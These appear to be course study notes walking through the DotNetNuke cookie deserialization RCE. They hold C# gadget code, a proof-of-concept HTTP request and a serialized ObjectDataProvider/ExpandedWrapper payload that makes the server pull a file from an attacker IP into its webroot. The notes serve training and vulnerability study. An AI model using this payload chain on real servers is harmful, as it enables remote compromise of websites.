#### DotNetNuke Cookie Deserialization RCE

serialization on a very high level involves a "producer" and a "consumer" of the serialized object. In other words, an application can define and instantiate an arbitrary object and modify its state in some way. It can then store the state of that object in the appropriate format (for example a binary file) using serialization. As long as the format of the saved file is understood by the "consumer" application, the object can be recreated in the process space of the consumer and further processed as desired.

1
(James Forshaw, 2012), https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf ↩︎

2
(Alvaro Muñoz, Oleksandr Mirosh, 2017), https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf ↩︎

1
(Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.binary.binaryformatter?view=netframework-4.7.2 ↩︎

2
(Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.xml.serialization.xmlserializer?view=netframework-4.7.2 ↩︎

##### XmlSerializer Limitations
Before we continue our analysis, we need to highlight some characteristics of the XmlSerializer class. As stated in the official Microsoft documentation,1 XmlSerializer is only able to serialize public properties and fields of an object.

Furthermore, the XmlSerializer class supports a narrow set of objects primarily due to the fact that it cannot serialize abstract classes. Finally, the type of the object being serialized always has to be known to the XmlSerializer instance at runtime. Attempting to deserialize object types unknown to the XmlSerializer instance will result in a runtime exception.

1
(Microsoft, 2017), https://docs.microsoft.com/en-us/dotnet/standard/serialization/introducing-xml-serialization ↩︎

```
01: using System;
02: using System.IO;
03: using System.Xml.Serialization;
04: 
05: namespace BasicXMLSerializer
06: {
07:     class Program
08:     {
09:         static void Main(string[] args)
10:         {
11:             MyConsoleText myText = new MyConsoleText();
12:             myText.text = args[0];
13:             MySerializer(myText);
14:         }
15: 
16:         static void MySerializer(MyConsoleText txt)
17:         {
18:             var ser = new XmlSerializer(typeof(MyConsoleText));
19:             TextWriter writer = new StreamWriter("C:\\Users\\Public\\basicXML.txt");
20:             ser.Serialize(writer, txt);
21:             writer.Close();
22:         }
23:     }
24: 
25:     public class MyConsoleText
26:     {
27:         private String _text;
28: 
29:         public String text
30:         {
31:             get { return _text; }
32:             set { _text = value; Console.WriteLine("My first console text class says: " + _text); }
33:         }
34:     }
35: }
```
Listing 1 - A very basic XmlSerializer application.


```
01: using System.IO;
02: using System.Xml.Serialization;
03: using BasicXMLSerializer;
04: 
05: namespace BasicXMLDeserializer
06: {
07:     class Program
08:     {
09:         static void Main(string[] args)
10:         {
11:             var fileStream = new FileStream(args[0], FileMode.Open, FileAccess.Read);
12:             var streamReader = new StreamReader(fileStream);
13:             XmlSerializer serializer = new XmlSerializer(typeof(MyConsoleText));
14:             serializer.Deserialize(streamReader);
15:         }
16:     }
17: }
```
Listing 2 - A very basic deserializing application

```
C:\Users\Administrator\source\repos\BasicXMLSerializer\BasicXMLSerializer\bin\x64\Debug>BasicXMLSerializer.exe "Hello AWAE"
My first console text class says: Hello AWAE
```
Listing 3 - Basic serialization of user-defined text

```
<?xml version="1.0" encoding="utf-8"?>
<MyConsoleText xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <text>Hello AWAE</text>
</MyConsoleText>
```
Listing 4 - Our serialized object as stored in basicXML.txt

Finally, we deserialize our object by running BasicXMLDeserializer.exe while passing the filename generated by BasicXMLSerializer.exe.

```
C:\Users\Administrator\source\repos\BasicXMLDeserializer\BasicXMLDeserializer\bin\x64\Debug>BasicXMLDeserializer.exe "C:\Users\Public\basicXML.txt"
My first console text class says: Hello AWAE
```
Listing 5 - Basic deserialization of an object containing user-defined text

#### Expanded XmlSerializer Example
Our previous example was rather rigid in that it could only deserialize an object of the type MyConsoleText, because that was hardcoded in the XmlSerializer constructor call.

```
XmlSerializer serializer = new XmlSerializer(typeof(MyConsoleText));
```
Listing 6 - Our XmlSerializer example could only handle a single type

```
01: using System;
02: using System.IO;
03: using System.Xml;
04: using System.Xml.Serialization;
05: 
06: namespace MultiXMLSerializer
07: {
08:     class Program
09:     {
10:         static void Main(string[] args)
11:         {
12:             String txt = args[0];
13:             int myClass = Int32.Parse(args[1]);
14: 
15:             if (myClass == 1)
16:             {
17:                 MyFirstConsoleText myText = new MyFirstConsoleText();
18:                 myText.text = txt;
19:                 CustomSerializer(myText);
20:             }
21:             else
22:             {
23:                 MySecondConsoleText myText = new MySecondConsoleText();
24:                 myText.text = txt;
25:                 CustomSerializer(myText);
26:             }
27:         }
28: 
29:         static void CustomSerializer(Object myObj)
30:         {
31:             XmlDocument xmlDocument = new XmlDocument();
32:             XmlElement xmlElement = xmlDocument.CreateElement("customRootNode");
33:             xmlDocument.AppendChild(xmlElement);
34:             XmlElement xmlElement2 = xmlDocument.CreateElement("item");
35:             xmlElement2.SetAttribute("objectType", myObj.GetType().AssemblyQualifiedName);
36:             XmlDocument xmlDocument2 = new XmlDocument();
37:             XmlSerializer xmlSerializer = new XmlSerializer(myObj.GetType());
38:             StringWriter writer = new StringWriter();
39:             xmlSerializer.Serialize(writer, myObj);
40:             xmlDocument2.LoadXml(writer.ToString());
41:             xmlElement2.AppendChild(xmlDocument.ImportNode(xmlDocument2.DocumentElement, true));
42:             xmlElement.AppendChild(xmlElement2);
43: 
44:             File.WriteAllText("C:\\Users\\Public\\multiXML.txt", xmlDocument.OuterXml);
45:         }
46:     }
47: 
48:     public class MyFirstConsoleText
49:     {
50:         private String _text;
51: 
52:         public String text
53:         {
54:             get { return _text; }
55:             set { _text = value; Console.WriteLine("My first console text class says: " + _text); }
56:         }
57:     }
58: 
59:     public class MySecondConsoleText
60:     {
61:         private String _text;
62: 
63:         public String text
64:         {
65:             get { return _text; }
66:             set { _text = value; Console.WriteLine("My second console text class says: " + _text); }
67:         }
68:     }
69: }
```
Listing 7 - A more versatile XmlSerializer use-case.


```
01: using System;
02: using System.Diagnostics;
03: using System.IO;
04: using System.Xml;
05: using System.Xml.Serialization;
06: 
07: namespace MultiXMLDeserializer
08: {
09:     class Program
10:     {
11:         static void Main(string[] args)
12:         {
13:             String xml = File.ReadAllText(args[0]);
14:             CustomDeserializer(xml);            
15:         }
16: 
17:         static void CustomDeserializer(String myXMLString)
18:         {
19:             XmlDocument xmlDocument = new XmlDocument();
20:             xmlDocument.LoadXml(myXMLString);
21:             foreach (XmlElement xmlItem in xmlDocument.SelectNodes("customRootNode/item"))
22:             {
23:                 string typeName = xmlItem.GetAttribute("objectType");
24:                 var xser = new XmlSerializer(Type.GetType(typeName));
25:                 var reader = new XmlTextReader(new StringReader(xmlItem.InnerXml));
26:                 xser.Deserialize(reader);
27:             }
28:         }
29:     }
30: }
```
Listing 8 - A more versatile deserializer use-case

```
C:\Users\Administrator\source\repos\MultiXMLSerializer\MultiXMLSerializer\bin\x64\Debug>MultiXMLSerializer.exe "Serializing first class..." 1
My first console text class says: Serializing first class...
```
Listing 9 - Serialization of the first example class


```
<customRootNode>
<item objectType="MultiXMLSerializer.MyFirstConsoleText, MultiXMLSerializer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null">
<MyFirstConsoleText xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
<text>Serializing first class...</text>
</MyFirstConsoleText>
</item>
</customRootNode>
```
Listing 10 - The resulting XML file contents

```
C:\Users\Administrator\source\repos\MultiXMLDeserializer\MultiXMLDeserializer\bin\x64\Debug>MultiXMLDeserializer.exe ""C:\Users\Public\multiXML.txt"
My first console text class says: Serializing first class...
```
Listing 11 - Deserialization of the first example class

```
<customRootNode>
<item objectType="MultiXMLSerializer.MySecondConsoleText, MultiXMLSerializer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null">
<MySecondConsoleText xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
<text>Serializing first class...</text>
</MySecondConsoleText>
</item>
</customRootNode>
```
Listing 12 - Manually modified XML file contents

If we deserialize this object, we get the following result:
```
C:\Users\Administrator\source\repos\MultiXMLDeserializer\MultiXMLDeserializer\bin\x64\Debug>MultiXMLDeserializer.exe ""C:\Users\Public\multiXML.txt"
My second console text class says: Serializing first class...
```
Listing 13 - Deserialization of the second example class

Change to deserialization code :

```
01: using System;
02: using System.Diagnostics;
03: using System.IO;
04: using System.Xml;
05: using System.Xml.Serialization;
06: 
07: namespace MultiXMLDeserializer
08: {
09:     class Program
10:     {
11:         static void Main(string[] args)
12:         {
13:             String xml = File.ReadAllText(args[0]);
14:             CustomDeserializer(xml);            
15:         }
16: 
17:         static void CustomDeserializer(String myXMLString)
18:         {
19:             XmlDocument xmlDocument = new XmlDocument();
20:             xmlDocument.LoadXml(myXMLString);
21:             foreach (XmlElement xmlItem in xmlDocument.SelectNodes("customRootNode/item"))
22:             {
23:                 string typeName = xmlItem.GetAttribute("objectType");
24:                 var xser = new XmlSerializer(Type.GetType(typeName));
25:                 var reader = new XmlTextReader(new StringReader(xmlItem.InnerXml));
26:                 xser.Deserialize(reader);
27:             }
28:         }
29:     }
30: 
31:     public class ExecCMD
32:     {
33:         private String _cmd;
34:         public String cmd
35:         {
36:             get { return _cmd; }
37:             set
38:             {
39:                 _cmd = value;
40:                 ExecCommand();
41:             }
42:         }
43: 
44:         private void ExecCommand()
45:         {
46:             Process myProcess = new Process();
47:             myProcess.StartInfo.FileName = _cmd;
48:             myProcess.Start();
49:             myProcess.Dispose();
50:         }
51:     }
52: }
```
Listing 14 - Deserialization application implements an additional class

In our trivial example, the ExecCMD class does not violate any of those constraints. Therefore we can change the XML file to look like this:

```<customRootNode>
<item objectType="MultiXMLDeserializer.ExecCMD, MultiXMLDeserializer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null">
<ExecCMD xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
<cmd>calc.exe</cmd>
</ExecCMD>
</item>
</customRootNode>
```
Listing 15 - Manipulation of the XML file to target an unintended object type


Notepad:

```
<customRootNode>
<item objectType="MultiXMLDeserializer.ExecCMD, MultiXMLDeserializer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null">
<ExecCMD xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
<cmd>notepad.exe</cmd>
</ExecCMD>
</item>
</customRootNode>
```
##### DotNetNuke Vulnerability Analysis

As we mentioned in our basic XmlSerializer examples, we had borrowed heavily from the DNN code base to demonstrate some of the pitfalls of deserialization. Therefore, the structure of the DeSerializeHashtable function shown in Figure 9 should look very familiar. Essentially, this function is responsible for the processing of the DNNPersonalization XML cookie using the following steps:

look for every item node under the profile root XML tag (line 156)
extract the serialized object type information from the item node "type" attribute (line 160)
create a XmlSerializer instance based on the extracted object type information (line 161)
deserialize the user-controlled serialized object (line 163)
Since it appears that no type checking is performed on the input object during deserialization, this certainly seems very exciting from the attacker perspective. However, to continue our analysis, we need to take a quick break and set up our debugging environment so that we can properly follow the execution flow of the target application while processing our malicious cookie values.

1
(Alvaro Muñoz, Oleksandr Mirosh, 2017), https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf ↩︎


##### Manipulation of Assembly Attributes for Debugging
Debugging .NET web applications can sometimes be a bit tricky due to the optimizations that are applied to the executables at runtime. One of the ways these optimizations manifest themselves in a debugging session is by preventing us from setting breakpoints at arbitrary code lines. In other words, the debugger is unable to bind the breakpoints to the exact lines of code we would like to break at. As a consequence of this, in addition to not being able to break where we want, at times we are also not able to view the values of local variables that exist at that point. This can make debugging .NET applications harder than we would like.

Fortunately, there is a way to modify how a target executable is optimized at runtime.1 More specifically, most software will be compiled and released in the Release version, rather than Debug. As a consequence, one of the assembly attributes would look like this:
```
[assembly: Debuggable(DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints)]
```
Listing 16 - Release versions of .NET assemblies are optimized at runtime

In order to enable a better debugging experience, i.e. to reduce the amount of optimization performed at runtime, we can change that attribute,2,3 to resemble the following:

```
[assembly: Debuggable(DebuggableAttribute.DebuggingModes.Default | DebuggableAttribute.DebuggingModes.DisableOptimizations | DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints | DebuggableAttribute.DebuggingModes.EnableEditAndContinue)]
```
Listing 17 - Specific assembly attributes can control the amount of optimization applied at runtime

As it so happens, this can be accomplished trivially using dnSpy. However, we need to make sure that we modify the correct assembly before we start debugging. In this instance, our target is the C:\inetpub\wwwroot\dotnetnuke\bin\DotNetNuke.dll file. It is important to note that once the IIS worker process starts, it will NOT load the assemblies from this directory. Rather it will make copies of all the required files for DNN to function and will load them from the following directory: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\dotnetnuke\.

We can then open the target assembly in dnSpy, right-click on its na
me in the Assembly Explorer and select the Edit Assembly Attributes (C#) option from the context menu 

Clicking on that option opens an editor for the assembly attributes.

Once we replace the relevant assembly attribute, we can just click on the Compile button, which will close the edit window. Finally, we'll save our edited assembly by clicking on the File > Save Module menu option

We can accept the defaults and have the edited assembly overwrite the original. At this point we are ready to start using our dnSpy debugger.
1
(dnSpy, 2019), https://github.com/0xd4d/dnSpy/wiki/Making-an-Image-Easier-to-Debug ↩︎

2
(Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.debuggableattribute.debuggingmodes?redirectedfrom=MSDN&view=netframework-4.7.2 ↩︎

3
(Rick Byers, 2005), https://blogs.msdn.microsoft.com/rmbyers/2005/09/08/debuggingmodes-ignoresymbolstoresequencepoints/ ↩︎


```
iisreset /noforce

```
##### Debugging DotNetNuke Using dnSpy

In order to properly debug DNN, we will need to attach our debugger (Debug > Attach menu entry) to the w3wp.exe process. This is the IIS worker process under which our instance of DNN is running. Please note that if you are unable to see the w3wp.exe process in the Attach to Process dialog box (Figure 14) in dnSpy, you simply need to browse to the DNN instance using a web browser. This will trigger IIS to start the appropriate worker process. You will then be able to see the w3wp.exe instance in the dialog box after clicking on the Refresh button.

Once we attach to our process, the first thing we need to do is pause its execution using the appropriate Debug menu option or the shortcut menu button. We then need to access Debug > Windows > Modules to list all the modules loaded by our w3wp.exe process.

By right-clicking on any of the listed modules, we can access the Open All Modules context menu. This will then load all available modules in the Assembly Explorer pane, which will allow us to easily access and decompile any DNN class we would like to investigate.

Once the modules are loaded, we can navigate to the LoadProfile(int,int) function implementation located in the DotNetNuke.Services.Personalization.PersonalizationController namespace in the DotNetNuke.dll assembly. We can then set a breakpoint on line 24, where our initial analysis started.

Send POC:

```
GET /dotnetnuke/DOESNOTEXIST HTTP/1.1
Host: localhost
Cache-Control: max-age=0
sec-ch-ua: "Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: DNNPersonalization=<POC></POC>
Connection: close


```
After hitting the BP, check call stack.

If we look backwards a couple of steps from the top of the call stack in Figure 19, we see that the getter for the UserMode property of the PortalSettings class is invoked. This getter function has a slightly complex implementation


We can see that the call to the Personalization.GetProfile method, the next entry in the call stack, is located on line 925. We can set a breakpoint on line 926 and resend our proof of concept request in order to verify that we can reach this call.

Notice that our breakpoint, which has been hit as part of the processing of our unauthenticated request, is located inside the if statement. However, one of the if statement conditions in this case is a check of the HttpContext.Current.Request.IsAuthenticated boolean variable, as can be seen on line 922. This is curious as we clearly are not using any authentication or session cookies in our request, yet our request is treated as authenticated.

In order to find out why that is, we need to look back at Figure 19 and notice that closer to the bottom of the call stack, there is a call to a function named AdvancedUrlReWriter.Handle404OrException. After tracing the code execution a few times, we discovered the root cause of the issue.

Although the implementation of this function is rather long and complex, we are concerned with an instance in which the HttpContext.User property is checked. As we can see in Figure 21, if the User property of the request is null, then it gets assigned the value of the current thread user.
The boolean variable IsAuthenticated now indicates that its value is "true" and that the request is authenticated under the "IIS\ APPPOOL" group. The reasoning for this logic appears to lie in the fact that the 404 handler is invoked before the HttpContext.User object is set. Since the continued processing of the given request depends on the User.IsAuthenticated property, the developers are ensuring that no null references will occur by setting the User object to the WindowsPrinicipal object of the currently running thread. 

##### Payload Options


####### FileSystemUtils PullFile Method

####### ObjectDataProvider Class

In their presentation, Muñoz and Mirosh also disclosed four .NET deserialization gadgets, or classes that can facilitate malicious activities during the user-controlled deserialization process. The ObjectDataProvider gadget is arguably the most versatile and was leveraged during their DNN exploit presentation.

According to the official documentation,1 the ObjectDataProvider class is used when we want to wrap another object into an ObjectDataProvider instance and use it as a binding source. This begs the question: What is a binding source? Once again, if we refer to the official documentation,2 we find that a binding source is simply an object that provides the programmer with relevant data. This data is then usually bound from its source to a target object such as a User Interface object (TextBox, ComboBox, etc) to display the data itself.3

How does ObjectDataProvider help us? If we read more about this class, we can see that it allows us to wrap an arbitrary object and use the MethodName property to call a method from a wrapped object, along with the MethodParameters property to pass any necessary parameters to the function specified in MethodName. The key here is that with the help of the ObjectDataProvider properties (not methods), we can trigger method calls in a completely different object.

This point is worth reiterating once more: by setting the MethodName property of the ObjectDataProvider object instance, we are able to trigger the invocation of that method. The ObjectDataProvider class also does not violate any limitations imposed by XmlSerializer, which means that it is an excellent candidate for our payload.

Based on the information from the official documentation, we need to take a closer look at the MethodName property as this is what triggers the target method in the wrapped object to be called.

Once we have decompiled the correct DLL, we can inspect the MethodName getter and setter implementations as shown below.

In Figure 25, we can see that when the MethodName property is set, the private _methodName variable is set and ultimately the base.Refresh function call takes place. We'll trace that call.

Here (Figure 26) we notice another function call, namely to BeginQuery. If we try to follow this execution path by clicking on the function name in dnSpy we will see the following:

This seems to be a dead end, but we need to realize that the ObjectDataProvider class inherits from the DataSourceProvider class, which is where dnSpy took us. Therefore, we need to make sure we navigate to the BeginQuery function implementation within the ObjectDataProvider class that overrides the inherited function.

At the end of BeginQuery (Figure 28) we can see that there is another call, specifically to the QueryWorker method. As before, we will continue tracing this as well.

Finally, in Figure 29, we arrive at a function call to InvokeMethodOnInstance on line 300. This is exactly the point at which the target method in the wrapped object is invoked.

Let's see if we can verify this chain of calls in a simple example project.

1
(Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.windows.data.objectdataprovider?redirectedfrom=MSDN&view=netframework-4.7.2 ↩︎

2
(Microsoft, 2017), https://docs.microsoft.com/en-us/dotnet/framework/wpf/data/how-to-specify-the-binding-source ↩︎

3
(Microsoft, 2019), https://docs.microsoft.com/en-us/dotnet/framework/wpf/data/data-binding-overview ↩︎


####### Example Use of the ObjectDataProvider Instance

We will try to reuse as much of the existing DNN code as possible so that we do not have to reinvent the wheel. For this reason, we need to make sure that the DotNetNuke.dll and the PresentationFramework.dll files are added as references to our project

Before continuing, we also need to make sure that we have a webserver available from which we can download an arbitrary file using the DNN vulnerability. We will use our Kali virtual machine for that purpose.


```
01: using System;
02: using System.IO;
03: using System.Xml.Serialization;
04: using DotNetNuke.Common.Utilities;
05: using System.Windows.Data;
06: 
07: namespace ODPSerializer
08: {
09:     class Program
10:     {
11:         static void Main(string[] args)
12:         {
13:             ObjectDataProvider myODP = new ObjectDataProvider();
14:             myODP.ObjectInstance = new FileSystemUtils();
15:             myODP.MethodName = "PullFile";
16:             myODP.MethodParameters.Add("http://192.168.119.120/myODPTest.txt");
17:             myODP.MethodParameters.Add("C:/inetpub/wwwroot/dotnetnuke/PullFileTest.txt");
18:             Console.WriteLine("Done!");
19:         }
20:     }
21: }
```
Listing 18 - Basic application to demonstrate the ObjectDataProvider functionality

In Listing 18 on lines 1-5, we first make sure we set all the appropriate "using" directives to define the required namespaces. Then starting on line 13, we:

Create a ObjectDataProvider instance
Instruct it to wrap a DNN FileSystemUtils object
Instruct it to call the PullFile method
Pass two arguments to the above mentioned method as required by its constructor

The first argument points to our Kali webserver IP address and the second argument is the path to which the downloaded file should be saved to.

We will compile this application in Visual Studio and debug it using dnSpy. To do so, we will start dnSpy and select the Start Debugging option from the Debug menu. In the Debug Program dialog box, we choose our compiled executable which should be located in the C:\Users\Administrator\source\repos\ODPSerializer\ODPSerializer\bin\Debug\ directory. We then need to ensure that the Break at option is set to "Entry Point".

As we are trying to verify the ObjectDataProvider analysis we performed earlier, we navigate to the System.Windows.Data.ObjectDataProvider.QueryWorker function implementation inside the PresentationFramework assembly and set a breakpoint on the function call to the InvokeMethodOnInstance method we identified earlier. We will finally let the process execution continue until this breakpoint is hit.

One thing to notice at this point is that if we let the execution of our process continue, we will once again hit this breakpoint. As a matter of fact, this breakpoint will be reached three times. This corresponds to the number of times we are manipulating values related to our ObjectDataProvider instance. First, we set the MethodName property, which triggers the code chain we just analyzed and thus our breakpoint. We then set the MethodParameters values twice which will also trigger the breakpoint albeit with a slightly different call stack.

Finally we can see in our webserver logs that the URL we specified has been reached and that the file C:/inetpub/wwwroot/dotnetnuke/PullFileTest.txt on the DNN server has been successfully created.

At this point, we have demonstrated that an instance of the ObjectDataProvider class can indeed trigger the FileSystemUtils.PullFile method by simply setting the appropriate properties. Therefore, the only thing left for us to do is attempt to serialize this object and verify that we can trigger the same chain of events during deserialization. If this works, we will then move on and attempt to use the same object in the DNNPersonalization cookie.

####### 4.3.4. Serialization of the ObjectDataProvider
As we mentioned earlier in this module, our DNNpersonalization cookie payload has to be in the XML format. Since we have already demonstrated how to serialize an object using the XmlSerializer class, we can add that code to our example application from Listing 18. However, based on our earlier analysis we know that the DNNPersonalization cookie has to be in a specific format in order to reach the deserialization function call. Specifically, it has to contain the "profile" node along with the "item" tag, which contains a "type" attribute describing the enclosed object. Rather than trying to reconstruct this structure manually, we can re-use the DNN function that creates that cookie value in the first place. This function is called SerializeDictionary and is located in the DotNetNuke.Common.Utilities.XmlUtils namespace.

With that in mind, we will adjust our application source code to look like the following:

01: using System;
02: using System.IO;
03: using System.Xml.Serialization;
04: using DotNetNuke.Common.Utilities;
05: using System.Windows.Data;
06: using System.Collections;
07: 
08: namespace ODPSerializer
09: {
10:     class Program
11:     {
12:         static void Main(string[] args)
13:         {
14:             ObjectDataProvider myODP = new ObjectDataProvider();
15:             myODP.ObjectInstance = new FileSystemUtils();
16:             myODP.MethodName = "PullFile";
17:             myODP.MethodParameters.Add("http://192.168.119.120/myODPTest.txt");
18:             myODP.MethodParameters.Add("C:/inetpub/wwwroot/dotnetnuke/PullFileTest.txt");
19: 
20:             Hashtable table = new Hashtable();
21:             table["myTableEntry"] = myODP;
22:             String payload = "; DNNPersonalization=" + XmlUtils.SerializeDictionary(table, "profile");
23:             TextWriter writer = new StreamWriter("C:\\Users\\Public\\PullFileTest.txt");
24:             writer.Write(payload);
25:             writer.Close();
26: 
27:             Console.WriteLine("Done!");
28:         }
29:     }
30: }
Listing 19 - Serialization of the ObjectDataProvider instance

Starting on line 20 in Listing 19, we create a HashTable instance and proceed by adding an entry called "myTableEntry" to which we assign our ObjectDataProvider instance. We then use the DNN function to serialize the entire object while providing the required "profile" node name. Finally, we prepend the cookie name to the resulting string and save the final cookie value to a file.

If we drill down to the _innerException > _message value of the exception variable, we can see that the serializer did not expect the FileSystemUtils class instance (Figure 40).

Figure 40: Details of the thrown exception
Figure 40: Details of the thrown exception
The reason this is happening is due to the way the XmlSerializer is instantiated in the SerializeDictionary function. If we refer to Figure 38, the XmlSerializer instance is created using whatever object type is returned by the GetType method on the object that was passed into the SerializeDictionary function. Since we are passing an ObjectDataProvider instance, this is the type the XmlSerializer will expect. It will have no knowledge of the object type that is wrapped in the ObjectDataProvider instance, which in our case is a FileSystemUtils object. Therefore the serialization fails.

It is important to note that we could in theory fix this issue by instantiating the XmlSerializer using a different constructor prototype, namely one that informs the XmlSerializer about the wrapped object type. The instantiation would then look similar to this:

XmlSerializer xmlSerializer = new XmlSerializer(myODP.GetType(), new Type[] {typeof(FileSystemUtils)});
Listing 20 - Modification to the XmlSerializer instantiation to inform it about the wrapped object type

However, this would not help us because the XmlSerializer instance inside the vulnerable DNN function would process the serialized object with the default constructor, i.e. it would not account for the additional object type generating the same error shown in Figure 40.

The bottom line for us is that we cannot successfully serialize our object using the DNN SerializeDictionary function. This means that we need to consider the use of a different object that can help us achieve our goal, namely invocation of the PullFile method.

We'll tackle that problem next.



####### 4.3.5. Enter The Dragon (ExpandedWrapper Class)
As a solution to the problem we described in the previous section, Muñoz and Mirosh suggested that the ExpandedWrapper class could be used to finalize the construction of a malicious payload. While that sounded good in theory, we found ourselves lacking details about how exactly this solution worked. Our assumption was that looking up the official documentation would be sufficient. However, in order to fully grasp the mechanics of this approach, a bigger effort is needed.

The official documentation1 for the ExpandedWrapper class states that:

This class is used internally by the system to implement support for queries with eager loading of related entities. This API supports the product infrastructure and is not intended to be used directly from your code.

This short explanation is not helpful to our understanding in any meaningful way. Furthermore, the explanation of the type parameters in the same document makes everything even more confusing at first. Although there seems to be a lack of publicly available explanations about the specific use-cases for this class, the .NET Framework is open source, which allows us to look at the actual implementation of this class and try to understand what exactly we are dealing with.

While the source code2 itself is not particularly interesting, the summary information at the beginning of the class implementation provides us with a clue.

<summary>Provides a base class implementing IExpandedResult over projections.</summary>

We are specifically focused on the term "projections". While the concept of projections may be familiar to some software developers, it is necessary for us to review this idea briefly so we can gain a better understanding of what the ExpandedWrapper class does. If we look at the official documentation for the Projection Operations,3 we learn that a projection is a mechanism by which a particular object is transformed into a different form.

Projections (and expansions) are typically found in the world of data providers and databases. Their primary purpose is to reduce the number of interactions between an application and a backend database relative to the number of queries that are executed. In other words, they facilitate data retrieval using JOIN queries, rather than multiple individual queries.4

While the details of this process are outside the scope of this module, there is one aspect of it that is highly relevant to our problem. Specifically, in order to enable the encapsulation of the data retrieved using expansions and projections, data providers need to be able to create objects of arbitrary types. This is accomplished using the ExpandedWrapper class, which represents a generic object type. Most importantly for us, the constructors for this class allow us to specify the object types of the objects that are encapsulated in a given instance. This is exactly what we need to enable the XmlSerializer to serialize an object properly and solve the issue we encountered previously.

In essence, we can use this class to wrap our source object (ObjectDataProvider) into a new object type and provide the properties we need (ObjectDataProvider.MethodName and ObjectDataProvider.MethodParameters). This set of information is assigned to the ExpandedWrapper instance properties, which will allow them to be serialized by the XmlSerializer. Again, this satisfies the XmlSerializer limitations as it cannot serialize class methods, but rather only public properties and fields.

Let's see how that looks in practice.

01: using System;
02: using System.IO;
03: using DotNetNuke.Common.Utilities;
04: using System.Collections;
05: using System.Data.Services.Internal;
06: using System.Windows.Data;
07: 
08: namespace ExpWrapSerializer
09: {
10:     class Program
11:     {
12:         static void Main(string[] args)
13:         {
14:             Serialize();
15:         }
16: 
17:         public static void Serialize()
18:         {
19:             ExpandedWrapper<FileSystemUtils, ObjectDataProvider> myExpWrap = new ExpandedWrapper<FileSystemUtils, ObjectDataProvider>();
20:             myExpWrap.ProjectedProperty0 = new ObjectDataProvider();
21:             myExpWrap.ProjectedProperty0.ObjectInstance = new FileSystemUtils();
22:             myExpWrap.ProjectedProperty0.MethodName = "PullFile";
23:             myExpWrap.ProjectedProperty0.MethodParameters.Add("http://192.168.119.120/myODPTest.txt");
24:             myExpWrap.ProjectedProperty0.MethodParameters.Add("C:/inetpub/wwwroot/dotnetnuke/PullFileTest.txt");
25: 
26: 
27:             Hashtable table = new Hashtable();
28:             table["myTableEntry"] = myExpWrap;
29:             String payload = XmlUtils.SerializeDictionary(table, "profile");
30:             TextWriter writer = new StreamWriter("C:\\Users\\Public\\ExpWrap.txt");
31:             writer.Write(payload);
32:             writer.Close();
33: 
34:             Console.WriteLine("Done!");
35:         }
36: 
37:     }
38: }
Listing 21 - Serializing an ExpandedWrapper object

In Listing 21 starting on line 19 we can see that instead of using the ObjectDataProvider directly, we are now instantiating an object of type ExpandedWrapper<FileSystemUtils, ObjectDataProvider>. Furthermore, we use the generic ProjectedProperty0 property to create an ObjectDataProvider instance. The remainder of code should look familiar.

If we compile and execute this code, we will see that there are no exceptions generated during the execution and that our webserver indeed processed a corresponding HTTP request.

The serialized object now looks like this:

<profile><item key="myTableEntry" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils, DotNetNuke, Version=9.1.0.367, Culture=neutral, PublicKeyToken=null],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><ProjectedProperty0><ObjectInstance xsi:type="FileSystemUtils" /><MethodName>PullFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">http://192.168.119.120/myODPTest.txt</anyType><anyType xsi:type="xsd:string">C:/inetpub/wwwroot/dotnetnuke/PullFileTest.txt</anyType></MethodParameters></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>
Listing 22 - Serialized ExpandedWrapper instance

However, our ultimate goal is to make sure that our serialized object can be properly deserialized within the DNN web application. We can test this quickly in our example application by implementing that functionality.

01: using System;
02: using System.IO;
03: using DotNetNuke.Common.Utilities;
04: using DotNetNuke.Common;
05: using System.Collections;
06: using System.Data.Services.Internal;
07: using System.Windows.Data;
08: 
